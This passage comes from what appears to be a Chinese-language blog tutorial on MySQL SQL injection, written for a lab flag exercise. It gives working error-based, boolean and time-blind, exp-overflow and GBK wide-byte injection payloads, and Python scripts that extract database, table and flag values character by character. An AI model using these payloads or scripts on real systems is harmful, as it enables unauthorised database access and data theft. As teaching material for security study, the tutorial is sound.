整条语句是一个大的select，最外层select的列名和表名随便写，不存在即可；第二层select是报错层，错误在这层select产生；user()是我们可以修改的语句，可以嵌套select，使用()包裹select合法语句。上面的语句可以当模板使用。</p><h4 id="2-1-爆数据库"><a href="#2-1-爆数据库" class="headerlink" title="2.1 爆数据库"></a>2.1 爆数据库</h4><p>payload：<code>id=1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x) a)</code><br>直接使用database()函数即可查询当前使用的数据库，这是最有效和最快的方法。</p><h4 id="2-2-爆表名"><a href="#2-2-爆表名" class="headerlink" title="2.2 爆表名"></a>2.2 爆表名</h4><p>payload：<code>id=1 and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#39;web&#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x) a)</code></p><p>使用()包裹新的select查询语句，报错注入中不能使用group_concat函数(或者说我还没学到)，需要使用limit来控制输出行数，一行一行的输出表名，拿到我们想要的表名即可。</p><h4 id="2-3-爆列名"><a href="#2-3-爆列名" class="headerlink" title="2.3 爆列名"></a>2.3 爆列名</h4><p>payload：<code>id=1 and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&#39;user&#39; and table_schema=&#39;web&#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x) a)</code></p><p>该payload在爆表名的基础上修改列名和查询表，以及where查询条件即可。<br>由于我的web数据库中的user表和mysql数据库的user表冲突，所以加上and语句。</p><h4 id="2-4-拿到flag"><a href="#2-4-拿到flag" class="headerlink" title="2.4 拿到flag"></a>2.4 拿到flag</h4><p>payload：<code>id=1 and (select 1 from (select count(*),concat((select flag from flag limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x) a)</code></p><p>这个很简单，就是替换一条查询语句，把列名和表替换成我们想读取的即可，当然也可以加入where条件，达到我们的预期效果；只要是合法的sql语句即可，再次又一次突出sql基础的重要性，你的sql水平决定你的sql注入水平。</p><h3 id="3-MySQL的一些特性"><a href="#3-MySQL的一些特性" class="headerlink" title="3. MySQL的一些特性"></a>3. MySQL的一些特性</h3><h4 id="3-1-name-const函数"><a href="#3-1-name-const函数" class="headerlink" title="3.1 name_const函数"></a>3.1 name_const函数</h4><p>name_const函数是给变量赋值<br>用法：select name_const(‘name’,’test’);<br>可以用来重复列名报错注入。只能拿到数据库版本<br>利用：select (select * from (select (name_const(version(),1)),name_const(version(),1))a);</p><h4 id="3-2-几何函数"><a href="#3-2-几何函数" class="headerlink" title="3.2 几何函数"></a>3.2 几何函数</h4><p>以下函数版本限制：MySQL &lt; 5.5.47<br>payload：<code>id = 1 and EXP(~(select * from (select user())a))</code><br>如果版本在5.5.47以下，会回显数据，但如果版本高于5.5.47，不会爆出语句执行结果；高版本可以使用这个特性来进行报错盲注。</p><h2 id="五、盲注"><a href="#五、盲注" class="headerlink" title="五、盲注"></a>五、盲注</h2><p>当页面不会把数据显示出来时，需要用到盲注；盲注分为布尔盲注和延时盲注。</p><h3 id="1-基础函数-1"><a href="#1-基础函数-1" class="headerlink" title="1. 基础函数"></a>1. 基础函数</h3><h4 id="1-1-substr函数"><a href="#1-1-substr函数" class="headerlink" title="1.1 substr函数"></a>1.1 substr函数</h4><p>substr函数 用于截取字符串，在前面我们已经使用过<br>用法：substr(str,pos,len)<br>参数一：需要截取的源字符串<br>参数二：开始截取的字符串下标，下标从1开始<br>参数三：截取长度，如果被忽略，则截取后面全部</p><h4 id="1-2-if函数"><a href="#1-2-if函数" class="headerlink" title="1.2 if函数"></a>1.2 if函数</h4><p>if函数 和大多数编程语言一致，都是条件判断函数<br>用法：select if(exp1,exp2,exp3)<br>参数一：if判断条件<br>参数二：条件为真返回结果<br>参数三：条件为假返回结果</p><h4 id="1-3-ascii函数"><a href="#1-3-ascii函数" class="headerlink" title="1.3 ascii函数"></a>1.3 ascii函数</h4><p>ascii函数 该函数返回一个字符的ascii函数，如果传递的参数有多个字符串，则返回第一个字符串的ascii值<br>用法：ascii(str)<br>参数一：str为字符，ascii的返回值在0-255之间</p><h4 id="1-4-length函数"><a href="#1-4-length函数" class="headerlink" title="1.4 length函数"></a>1.4 length函数</h4><p>length函数 与大部分编程语言一致，返回字符串长度<br>用法：length(str)</p><h4 id="1-5-sleep函数"><a href="#1-5-sleep函数" class="headerlink" title="1.5 sleep函数"></a>1.5 sleep函数</h4><p>sleep()函数 让程序带在当前位置停顿，停顿时间由参数决定，单位是秒<br>用法：select sleep(5);</p><h4 id="1-6-benchmark函数"><a href="#1-6-benchmark函数" class="headerlink" title="1.6 benchmark函数"></a>1.6 benchmark函数</h4><p>benchmark函数，重复执行表达式多少次<br>用法：benchmark(x,exp) 表达式exp执行x次<br>通过执行多次来达到sleep的效果</p><h3 id="2-布尔盲注"><a href="#2-布尔盲注" class="headerlink" title="2. 布尔盲注"></a>2. 布尔盲注</h3><p>布尔盲注：人为的构造一个判断条件，条件为真正常返回，条件为假返回异常；利用这个特性，就可以根据我们的输入来逐个判断数据库中的数据。</p><h4 id="2-1-猜数据库"><a href="#2-1-猜数据库" class="headerlink" title="2.1 猜数据库"></a>2.1 猜数据库</h4><p><strong>先猜数据库名称长度：</strong><br>payload：<code>id=1 and length(database())=1</code><br>database()函数会返回当前数据库名，使用length()函数取数据库字符长度和1比较；如果当前数据库长度不等于1，则返回假，由于and运算符一个为假结果为假，所以页面显示异常。</p><p><strong>然后猜数据</strong><br>payload：<code>id=1 and length(database())=1</code><br>database()函数会返回当前数据库名，使用length()函数取数据库字符长度和1比较；如果当前数据库长度不等于1，则返回假，由于and运算符一个为假结果为假，所以页面显示异常。<br>payload：<code>id=1 and if((ascii(substr((database()),1,1))=119),1,0)</code><br>构造payload的时候，把格式构造好，然后逐个添加值，这样括号不容易出错。<br>119是我们猜测数据库的第一个字母的ascii值，值可以是0-255(一般从32开始到127)；修改substr的第二个来控制数据库名的第几位；<br>一般使用脚本来完成这件事，当然使用burp的爆破工具是最省事的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line">url = <span class="string">&quot;http://192.168.1.128/6/8/intsql.php&quot;</span></span><br><span class="line">f = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):<span class="comment">#数据库长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1 and if((ascii(substr((database()),&quot;</span>+<span class="built_in">str</span>(k+<span class="number">1</span>)+<span class="string">&quot;,1))=&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;),1,0)&quot;</span>&#125;</span><br><span class="line">        <span class="comment">#print (payload)</span></span><br><span class="line">        html = requests.post(url,data=payload)</span><br><span class="line">        a = re.findall(<span class="string">&#x27;&lt;h6&gt;(.*?)&lt;/h6&gt;&#x27;</span>,html.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">1</span>:</span><br><span class="line">            f += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span> (f)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4 id="2-2-猜表名"><a href="#2-2-猜表名" class="headerlink" title="2.2 猜表名"></a>2.2 猜表名</h4><p><strong>先猜表名长度</strong><br>payload：<code>id=1 and if((select length(table_name) from information_schema.tables where table_schema=&#39;web&#39; limit 0,1)=4,1,0)</code><br>只能使用limit一条条数据猜解，使用burp的intruder模块的数值递增来完成爆破。</p><p><strong>猜表名内容</strong><br>payload：<code>id=1 and if((select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=&#39;web&#39; limit 0,1)=1,1,0)</code><br>通过修改第二个比较值来获得字符的ascii码；通过修改substr的参数2来实现其他几个字符的爆破<br>payload构造过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">id=1 and if(x=1,1,0)//构造框架</span><br><span class="line"></span><br><span class="line">select table_name from information_schema.tables where table_schema=&#x27;web&#x27;//构造x</span><br><span class="line"></span><br><span class="line">id=1 and if(select table_name from information_schema.tables where table_schema=&#x27;web&#x27;=1,1,0)//替换x</span><br><span class="line"></span><br><span class="line">ascii(table_name)//构造ascii函数</span><br><span class="line"></span><br><span class="line">substr(table_name,1,1)//构造substr函数</span><br><span class="line"></span><br><span class="line">ascii(substr(table_name,1,1))//合并替换</span><br><span class="line"></span><br><span class="line">id=1 and if(select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=&#x27;web&#x27; limit 0,1=1,1,0)</span><br><span class="line">//合并替换加入limit</span><br><span class="line"></span><br><span class="line">id=1 and if((select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=&#x27;web&#x27; limit 0,1)=1,1,0)</span><br><span class="line">//整个select语句是第一个比较值，所以用()括起来</span><br></pre></td></tr></table></figure><h4 id="2-3-猜列名"><a href="#2-3-猜列名" class="headerlink" title="2.3 猜列名"></a>2.3 猜列名</h4><p><strong>列名长度</strong><br>payload：<code>id=1 and if((select length(column_name) from information_schema.columns where table_schema=&#39;web&#39; and table_name=&#39;user&#39; limit 0,1)=1,1,0)</code><br>使用猜表名长度的payload修改列名和表名即可得到猜列名长度的payload。当修改了limit参数后if比较值2递增到100以上，猜测没有这个列，由此可得该表有多少列。<br><strong>列名名称</strong><br>payload：<code>id=1 and if((select ascii(substr(column_name,1,1)) from information_schema.columns where table_schema=&#39;web&#39; and table_name=&#39;user&#39; limit 0,1)=1,1,0)</code><br>和猜表名名称大同小异，需要注意的是一个表中会存在多个列名，通过修改limit的参数1来控制猜第几个。通过循环猜列名长度和列名名称来爆出所有列。</p><h4 id="2-4-读取flag"><a href="#2-4-读取flag" class="headerlink" title="2.4 读取flag"></a>2.4 读取flag</h4><p><strong>猜长度</strong><br>payload：<code>id=1 and if((select length(flag) from flag)=1,1,0)</code></p><p><strong>猜值</strong><br>payload：<code>id=1 and if((select ascii(substr(flag,1,1)) from flag)=1,1,0)</code><br>修改对应的参数来获取对于的值</p><h3 id="3-延时盲注"><a href="#3-延时盲注" class="headerlink" title="3. 延时盲注"></a>3. 延时盲注</h3><p>当返回无回显，并且只有一种返回结果时，这种情况需要延时盲注；根据服务端响应的时间，来猜测数据；相对来说效率较低，因为需要使用延时函数。<br>延时盲注和布尔盲注的paylaod区别就是把if为真返回的参数改为延时函数(if函数参数2)，来达到响应延时的效果。</p><h4 id="3-1-猜数据库"><a href="#3-1-猜数据库" class="headerlink" title="3.1 猜数据库"></a>3.1 猜数据库</h4><p>猜长度payload：<code>id=1 and (select if((length(database()))=3,sleep(2),0))</code><br>猜名称payload：<code>id=1 and (select if((ascii(substr(database(),1,1)))=119,sleep(2),0))</code><br>实现原理了布尔盲注一致，不在叭叭<del>\</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,time</span><br><span class="line">url = <span class="string">&quot;http://192.168.1.128/6/8/intsql.php&quot;</span></span><br><span class="line">f = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):<span class="comment">#数据库长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1 and if((ascii(substr((database()),&quot;</span>+<span class="built_in">str</span>(k+<span class="number">1</span>)+<span class="string">&quot;,1))=&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;),sleep(3),0)&quot;</span>&#125;</span><br><span class="line">        <span class="comment">#print (payload)</span></span><br><span class="line">        first = time.time()</span><br><span class="line">        r = requests.post(url,data=payload)</span><br><span class="line">        second = time.time()</span><br><span class="line">        offset = second-first</span><br><span class="line">        <span class="keyword">if</span> offset&gt;<span class="number">2</span>:</span><br><span class="line">            f += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span> (f)</span><br></pre></td></tr></table></figure><h4 id="3-2-猜表名"><a href="#3-2-猜表名" class="headerlink" title="3.2 猜表名"></a>3.2 猜表名</h4><p>由于表存在多个，我们使用group_concat函数来查询，思路：表名称长度合集的长度&#x3D;&#x3D;&gt;表长度合集内容&#x3D;&#x3D;&gt;所有表名称长度合集&#x3D;&#x3D;&gt;表名称<br>猜表名称长度合集的长度payload：<code>id=1 and (select if((select length(group_concat(length(table_name)))length from information_schema.tables where table_schema=&#39;web&#39;)=1,sleep(2),0))</code><br>比如表1是@n,长度x；表2是@m，长度y。所以他们的的长度合集是”x,y”，该paylaod爆出”x,y”的长度，接下来爆出”x,y”的值，当然这种方法表名长度超过10不适用。</p><p>表长度合集内容：<code>id=1 and (select if((select ascii(substr(group_concat(length(table_name)),1,1)) from information_schema.tables where table_schema=&#39;web&#39;)=1,sleep(2),0))</code><br>通过修改该payload爆出长度合集，格式”4,4”。这样就知道了有几个表。当然也可以直接爆名称，当32-127都没有匹配时，即可停止</p><p>所有表名称长度合集：<br>数据库中有两个表，两个表名称长度都为4。4+4+一个逗号，所以所有表名称长度为8+1，我们需要控制substr参数2从1到8来爆出表名。<strong>写完我才发现，我好像多走了一步，直接爆表名称合集长度，然后爆内容即可，写都写好就不改了，知道怎么用就行了。</strong></p><p>爆表名称：<code>id=1 and (select if((select ascii(substr(group_concat(table_name),1,1)) from information_schema.tables where table_schema=&#39;web&#39;)=102,sleep(2),0))</code><br>只需要把表长度合集内容的payload的length参数去掉即可。</p><h4 id="3-3-猜列名"><a href="#3-3-猜列名" class="headerlink" title="3.3 猜列名"></a>3.3 猜列名</h4><p>修改猜表名的列名和表名即可，不在赘述。</p><h4 id="3-4-拿flag"><a href="#3-4-拿flag" class="headerlink" title="3.4 拿flag"></a>3.4 拿flag</h4><p>和布尔型盲注大同小异，不在赘述。学会原理就可，没必要一定拿到flag。我之前就是这种杠精(哈哈哈)</p><h4 id="3-5-数据库名长度"><a href="#3-5-数据库名长度" class="headerlink" title="3.5 数据库名长度"></a>3.5 数据库名长度</h4><p>下面使用and短路特性，and运算只有两个表达式都为true结果才为true，程序是从前往后执行的，当前面的表达式返回flase时，and运行就不会继续向后运算。<br>payload：<code>select length(database())=3 and sleep(2);</code></p><p>当数据库名长度为3时，会执行sleep函数，造成延时。<br>当数据库名长度不为3时，程序会返回不执行sleep函数。<br>当if语句被过滤时，可以使用，但我感觉and方式更简单(小声bb)</p><h2 id="六、exp报错盲注"><a href="#六、exp报错盲注" class="headerlink" title="六、exp报错盲注"></a>六、exp报错盲注</h2><h3 id="1-整数范围"><a href="#1-整数范围" class="headerlink" title="1. 整数范围"></a>1. 整数范围</h3><p>mysql中存在多种整数类型，分别是：tinyint，smallint，mediumint，int，bigint。<br><img src="https://img.xpctf.cn/img/20200628084754.png"></p><p>在5.5版本之前，超过最大整数，数据库不会报错；5.5之后的版本才会报错。<br><img src="https://img.xpctf.cn/img/20200628085246.png"></p><h3 id="2-exp函数"><a href="#2-exp函数" class="headerlink" title="2.exp函数"></a>2.exp函数</h3><p>exp函数 返回e的X次方的值,多少次方由参数决定，当exp的参数大于709时，返回大于最大整数，导致报错。<br>用法：exp(5)实例：selecp exp(5);e &#x3D; 2.71828183</p><h3 id="3-exp报错盲注"><a href="#3-exp报错盲注" class="headerlink" title="3. exp报错盲注"></a>3. exp报错盲注</h3><p>payload原型：<code>id=1 and exp(709+C-ascii(substr((select database()),1,1)));</code><br>分析：709是exp可计算最大的值，当exp参数大于709就会报错；通过控制C来爆出数据库名，当数据库名的ascii码小于C时就会报错<br>数学公式：709+C-ascii()&#x3D;710<br>也知C，则ascii()&#x3D;709+c-710<br>假设数据库报错时C为120，根据公式推算ascii()为119，119通过解码得到’w’，由此可得数据库第一个字母为’w’。上面只是为了搞清原理：ascii()&#x3D;C-1<br>上述方法适用于C递增，也可以使用C递减；使用C递减时，当数据库不报错时，C的值等于ascii()值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">库名长度</span><br><span class="line">id=1 and exp(709+1-length((select database())));</span><br><span class="line"></span><br><span class="line">库名</span><br><span class="line">id=1 and exp(709+119-ascii(substr((select database()),1,1)));</span><br><span class="line"></span><br><span class="line">表名长度</span><br><span class="line">id=1 and exp(709+1-(select length(group_concat(table_name)) from information_schema.tables where table_schema=database()));</span><br><span class="line">//直接使用database()函数读取库名，省去爆库</span><br><span class="line"></span><br><span class="line">表名</span><br><span class="line">id=1 and exp(709+1-(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))));</span><br><span class="line"></span><br><span class="line">列名长度</span><br><span class="line">id=1 and exp(709+1-(select length(group_concat(column_name)) from information_schema.columns where table_name=&#x27;flag&#x27;));</span><br><span class="line"></span><br><span class="line">列名</span><br><span class="line">id=1 and exp(709+1-(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),1,1))));</span><br><span class="line"></span><br><span class="line">数据长度</span><br><span class="line">id=1 and exp(709+1-(select length(group_concat(flag)) from flag));</span><br><span class="line"></span><br><span class="line">数据</span><br><span class="line">id=1 and exp(709+1-(ascii(substr((select group_concat(flag) from flag),1,1))));</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#库名</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.1.128/6/5/intsql.php&quot;</span></span><br><span class="line">f = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):<span class="comment">#长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1 and exp(709+&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;-ascii(substr((select database()),&quot;</span>+<span class="built_in">str</span>(k+<span class="number">1</span>)+<span class="string">&quot;,1)));&quot;</span>&#125;</span><br><span class="line">        <span class="comment">#print (payload)</span></span><br><span class="line">        r = requests.post(url,data=payload).text</span><br><span class="line">        <span class="keyword">if</span> r.find(<span class="string">&#x27;range&#x27;</span>)!=-<span class="number">1</span>:</span><br><span class="line">            f += <span class="built_in">chr</span>(i-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span> (f)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#表名</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.1.128/6/5/intsql.php&quot;</span></span><br><span class="line">f = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):<span class="comment">#长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1 and exp(709+&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;-(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot;</span>+<span class="built_in">str</span>(k+<span class="number">1</span>)+<span class="string">&quot;,1))));&quot;</span>&#125;</span><br><span class="line">        <span class="comment">#print (payload)</span></span><br><span class="line">        r = requests.post(url,data=payload).text</span><br><span class="line">        <span class="keyword">if</span> r.find(<span class="string">&#x27;range&#x27;</span>)!=-<span class="number">1</span>:</span><br><span class="line">            f += <span class="built_in">chr</span>(i-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span> (f)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#列名</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.1.128/6/5/intsql.php&quot;</span></span><br><span class="line">f = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):<span class="comment">#长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1 and exp(709+&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;-(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),&quot;</span>+<span class="built_in">str</span>(k+<span class="number">1</span>)+<span class="string">&quot;,1))))&quot;</span>&#125;</span><br><span class="line">        <span class="comment">#print (payload)</span></span><br><span class="line">        r = requests.post(url,data=payload).text</span><br><span class="line">        <span class="keyword">if</span> r.find(<span class="string">&#x27;range&#x27;</span>)!=-<span class="number">1</span>:</span><br><span class="line">            f += <span class="built_in">chr</span>(i-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span> (f)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#数据</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.1.128/6/5/intsql.php&quot;</span></span><br><span class="line">f = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):<span class="comment">#长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1 and exp(709+&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;-(ascii(substr((select group_concat(flag) from flag),&quot;</span>+<span class="built_in">str</span>(k+<span class="number">1</span>)+<span class="string">&quot;,1))))&quot;</span>&#125;</span><br><span class="line">        <span class="comment">#print (payload)</span></span><br><span class="line">        r = requests.post(url,data=payload).text</span><br><span class="line">        <span class="keyword">if</span> r.find(<span class="string">&#x27;range&#x27;</span>)!=-<span class="number">1</span>:</span><br><span class="line">            f += <span class="built_in">chr</span>(i-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span> (f)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="七、宽字节注入"><a href="#七、宽字节注入" class="headerlink" title="七、宽字节注入"></a>七、宽字节注入</h2><h3 id="1-字符编码"><a href="#1-字符编码" class="headerlink" title="1. 字符编码"></a>1. 字符编码</h3><h4 id="1-1-url编码"><a href="#1-1-url编码" class="headerlink" title="1.1 url编码"></a>1.1 url编码</h4><p>url编码 主要用于URL中，对字符进行编码。编码原理：字符的ASCII值得16进制，再在前面加上一个%，\是宽字节注入的重点，%5c</p><h4 id="1-2-GBK编码"><a href="#1-2-GBK编码" class="headerlink" title="1.2 GBK编码"></a>1.2 GBK编码</h4><p>GBK全称叫汉字内码扩展规范，GBK编码共收录21886个汉字和图像符号，其中汉字21003个，图形符号883个<br><strong>主要重点：</strong>GBK是一种多字符编码，编码一个汉字需要两个字节，并且汉字编码的第一个字节大于128</p><h5 id="1-3-utf8编码"><a href="#1-3-utf8编码" class="headerlink" title="1.3 utf8编码"></a>1.3 utf8编码</h5><p>unicode编码的出现：计算机在刚刚出现的时候，只有ASCII码，随着计算机的使用越来越广泛，就产生了许多新的编码方式，不如GB2312 BIG5 Shif_JIS 后来为了统一这些编码方式，出现了unicode编码。<br>unicode编码和utf8的关系：utf8编码是unicode编码的一种实现方式，根据不同的unicode字符，用1-6个字节来编码<br><strong>主要重点：</strong>utf8编码汉字，编码一个汉字使用三个字节</p><h3 id="2-宽字节注入"><a href="#2-宽字节注入" class="headerlink" title="2. 宽字节注入"></a>2. 宽字节注入</h3><p>宽字节注入主要用于字符型注入 单引号别转义的情况,常用的转义函数有addslashes() mysql_real_escape_string() mysql_escape_string() 作用是将单引号转义，来防止sql注入。<br>宽字节注入原理：利用MySQL在进行数据传输时，编码的不一致，导致了转义字符被吃掉，形成sql注入。<br>反斜杠\的16进制是5c，当我们在前面加上%df，组合成%df%5c,当MySQL使用了gbk编码，MySQL会认为df5c是一个汉字，这样就会把刚刚转义添加的反斜杠吃掉。<br>username&#x3D;admin%df’ 转义username&#x3D;admin&#39; GBK重编码 username&#x3D;admin運’<br><strong>注意：</strong>第一个字节的范围要大于128，比如说%df，才能达到汉字的范围。</p><h4 id="2-1-测试回显"><a href="#2-1-测试回显" class="headerlink" title="2.1 测试回显"></a>2.1 测试回显</h4><p>与union联合注入相似，都是使用order by来才是列数，使用union测试回显位。<br>列数payload：<code>username=admin%df%27 order by 3%23&amp;password=admin</code><br>回显payload：<code>username=admin%df%27 union select 1,2,3%23&amp;password=admin</code></p><h4 id="2-2-爆库名"><a href="#2-2-爆库名" class="headerlink" title="2.2 爆库名"></a>2.2 爆库名</h4><p>这种有回显的注入都不需要猜长度，能直接回显，非常简单，可以跳过爆库名，直接使用database()<br>paylaod：<code>username=admin%df%27 union select 1,database(),3%23&amp;password=admin</code></p><h4 id="2-3-爆表名-1"><a href="#2-3-爆表名-1" class="headerlink" title="2.3 爆表名"></a>2.3 爆表名</h4><p>由于where也要使用引号来包含，下面直接使用database()函数，这也是最省事的方法。<br>paylaod：<code>username=admin%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23&amp;password=admin</code></p><h4 id="2-4-爆列名-1"><a href="#2-4-爆列名-1" class="headerlink" title="2.4 爆列名"></a>2.4 爆列名</h4><p>把表名使用16进制编码，即可绕过单引号，得加上0x表示该字符串是16进制。<br>paylaod：<code>username=admin%df%27 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x666c6167%23&amp;password=admin</code></p><h4 id="2-5-爆数据"><a href="#2-5-爆数据" class="headerlink" title="2.5 爆数据"></a>2.5 爆数据</h4><p>payload：<code>username=admin%df%27 union select 1,flag,3 from flag%23&amp;password=admin</code></p><h2 id="八、各种绕过"><a href="#八、各种绕过" class="headerlink" title="八、各种绕过"></a>八、各种绕过</h2><h3 id="1-空格过滤绕过"><a href="#1-空格过滤绕过" class="headerlink" title="1. 空格过滤绕过"></a>1. 空格过滤绕过</h3><p>该种情况主要是用于过滤空格使用</p><h4 id="1-1-换行符绕过"><a href="#1-1-换行符绕过" class="headerlink" title="1.1 换行符绕过"></a>1.1 